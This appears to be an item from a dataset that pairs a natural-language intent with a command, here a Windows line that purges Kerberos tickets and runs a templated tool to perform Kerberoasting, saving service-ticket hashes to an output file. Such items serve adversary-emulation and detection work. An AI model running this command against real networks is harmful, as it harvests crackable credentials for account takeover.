# Natural language intent:
# Purge Kerberos tickets, execute a command using cmd.exe, and perform Kerberoasting with specific flags and output file.

klist purge ; cmd.exe /c "${local_folder}${local_executable}" kerberoast ${flags} /outfile:"${local_folder}${out_file}"
